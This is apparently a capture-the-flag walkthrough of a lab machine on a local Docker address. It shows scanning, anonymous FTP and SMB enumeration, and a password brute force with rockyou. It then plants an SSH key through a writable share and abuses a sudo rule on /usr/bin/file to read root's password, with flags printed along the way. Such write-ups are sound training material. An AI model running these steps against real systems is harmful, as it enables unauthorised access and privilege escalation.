# IP
172.17.0.2
# Reconnaissance
## Host discovery
```sh
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.068 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.049 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1024ms
rtt min/avg/max/mdev = 0.049/0.058/0.068/0.009 ms
```
## Ports scanning (TCP)
### Quick scan 
``` sh
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-02 16:12 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: FE:32:6A:24:FC:C7 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
```
### Deep scan
``` sh
sudo nmap -p21,22,139,445 -sS -sCV --min-rate 5000 -T4 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-02 16:13 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000023s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              69 Aug 19  2024 nota.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a2:4e:66:7d:e5:2e:cf:df:54:39:b2:08:a9:97:79:21 (ECDSA)
|_  256 92:bf:d3:b8:20:ac:76:08:5b:93:d7:69:ef:e7:59:e1 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: FE:32:6A:24:FC:C7 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-10-02T19:13:32
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.76 seconds
```
# FTP enumeration
## Anonymous login
Nmap default script found FTP has anonymous valid login
``` sh
ftp 172.17.0.2
ftp> ls
-rw-r--r--    1 0        0              69 Aug 19  2024 nota.txt
ftp> get nota.txt
ftp> bye

cat nota.txt
I don't know what to do with Macarena, she's obsessed with donald.
```
Two possible users: *macarena* and *donald*
# SMB enumeration
## Null session
### Users
``` sh
nxc smb 172.17.0.2 --users
SMB         172.17.0.2      445    002ED7776BCD     [*] Unix - Samba (name:002ED7776BCD) (domain:002ED7776BCD) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         172.17.0.2      445    002ED7776BCD     -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         172.17.0.2      445    002ED7776BCD     macarena                      2024-08-19 16:22:11 0
SMB         172.17.0.2      445    002ED7776BCD     [*] Enumerated 1 local users: 002ED7776BCD
```
Indead, *macarena* is a username
### Shares
``` sh
smbmap -H 172.17.0.2 -p 445

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)

[+] IP: 172.17.0.2:445  Name: 172.17.0.2                Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        macarena                                                NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (002ed7776bcd server (Samba, Ubuntu))
[*] Closed 1 connections
```
### Brute force
``` sh
nxc smb 172.17.0.2 -u macarena -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
SMB         172.17.0.2      445    002ED7776BCD     [+] 002ED7776BCD\macarena:donald
```
Found credentials *macarena:donald*
This was what the note.txt hint was trying to say
## Macarena session
### Shares
```sh
nxc smb 172.17.0.2 -u macarena -p donald --shares
SMB         172.17.0.2      445    002ED7776BCD     [*] Unix - Samba (name:002ED7776BCD) (domain:002ED7776BCD) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         172.17.0.2      445    002ED7776BCD     [+] 002ED7776BCD\macarena:donald
SMB         172.17.0.2      445    002ED7776BCD     [*] Enumerated shares
SMB         172.17.0.2      445    002ED7776BCD     Share           Permissions     Remark
SMB         172.17.0.2      445    002ED7776BCD     -----           -----------     ------
SMB         172.17.0.2      445    002ED7776BCD     print$          READ            Printer Drivers
SMB         172.17.0.2      445    002ED7776BCD     macarena        READ,WRITE
SMB         172.17.0.2      445    002ED7776BCD     IPC$                            IPC Service (002ed7776bcd server (Samba, Ubuntu))
```
### macarena share
``` sh
smbclient //172.17.0.2/macarena -U "macarena%donald"
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
smb: \> exit

tree -a
├── .bash_history
├── .bash_logout
├── .bashrc
├── .cache
│   └── motd.legal-displayed
├── .profile
└── user.txt
```
# User flag
``` sh
cat user.txt
ef65ad731de0ebabcb371fa3ad4972f1
```
# SSH
To obtain a permanent shell let's upload an ssh key.
``` sh
ssh-keygen -t ed25519 -C "macarena"
mkdir .ssh
touch .ssh/authorized_keys
'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDHRPsbWyPcPVaALpxqz1NeozvIgdYMZ4WuThT5pCV5k macarena' > .ssh/authorized_keys
smbclient //172.17.0.2/macarena -U "macarena%donald"
smb: \> recurse on
smb: \> prompt off
smb: \> mput .ssh
```
``` sh
ssh -i ~/.ssh/id_ed25519 macarena@172.17.0.2
```
# Privilege escalation
I got the ssh login but still don't know macarena's password
## SUID
No interesting SUID
## GUID
No GUID at all
## Capabilites
No capabilities
## Crontabs
No interesting crontabs
## Dir scanning
Looking through directories i found
``` sh
ls -l
total 4
-rw------- 1 root root 16 Aug 19  2024 password.txt
```
which i cannot read
Found a hash
``` sh
cat /home/secret/hash
MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===
```
``` sh
base32 -d hash.txt | base64 -d
supersecurepassword
```
## Sudo misconfiguration
``` sh
sudo -l
(ALL : ALL) /usr/bin/file
```
``` sh
sudo -u root /usr/bin/file -f /opt/password.txt
root:rooteable2: cannot open `root:rooteable2' (No such file or directory)
su root
whoami
root
```
# Root flag
``` sh
cat root.txt
It's not that easy, first root.
cat true_root.txt
efb6984b9b0eb57451aca3f93c8ce6b7
```
